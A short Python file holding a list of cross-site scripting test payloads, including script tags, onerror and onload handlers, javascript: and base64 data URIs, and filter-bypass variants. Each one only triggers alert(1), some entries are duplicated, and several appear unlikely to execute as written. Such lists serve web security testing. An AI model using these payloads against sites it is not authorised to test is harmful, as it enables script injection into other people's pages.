# XSS payloadat to test
payloads = [
    '<script>alert(1)</script>',
    '<img src="x" onerror="alert(1)">',
    '<svg/onload=alert(1)>',
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror=alert(1) />',
    '<img src=x onerror=alert`1`>',
    '<img src=x oneonerrorrror=alert(1)>',
    '<img src=x oneonerrorrror=alert`1`>',
    '<img src=x:alert(1)//',
    '<img src=x:alert(1)//>',
    '<img src=x:alert`1`//',
    '<img src=x:alert`1`//>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>',
    '<svg><script>alert(1)</script></svg>',
    '<svg><g/onload=alert(1)>',
    '<svg><style>{font-family&colon;"<img src=x onerror=alert(1)>"}</style></svg>',
    '<marquee/onstart=alert(1)>',
    '<x y="</script><img src=x onerror=alert(1)//">',
    '<x y="</script><img src=x onerror=alert(1)//">',
    '<img src=x:x onerror=alert(1)>',
    '<img src=x:x oneonerrorrror=alert(1)>',
    '<img src=x:x oneonerrorrror=alert`1`>',
    '<img src=x:x onerror=alert(1)//>',
    '<img src=x:x onerror=alert`1`//>',
    '<img src=x:x:alert(1)//',
    '<img src=x:x:alert(1)//>',
    '<img src=x:x:alert`1`//',
    '<img src=x:x:alert`1`//>',
    '<video><source onerror="javascript:alert(1)"></video>',
    '<video poster=javascript:alert(1)//></video>',
    '<video><source onerror="javascript:alert(1)"//></video>',
    '<input type="text" value="```><img src=x onerror=alert(1)>">',
    '<input type="text" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<textarea><img src=x onerror=alert(1)></textarea>',
    '<input type="password" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="email" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="url" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="search" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="tel" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="number" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="range" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="date" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="color" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="checkbox" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="radio" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="file" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="hidden" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="image" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="button" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="submit" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="reset" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="datetime" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="datetime-local" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="month" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="week" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="time" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="datetime-local" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<input type="datetime-local" value="```><img src=x onerror=alert(1)>" autofocus>',
    '<img src="x` `<script>alert(1)</script>">',
]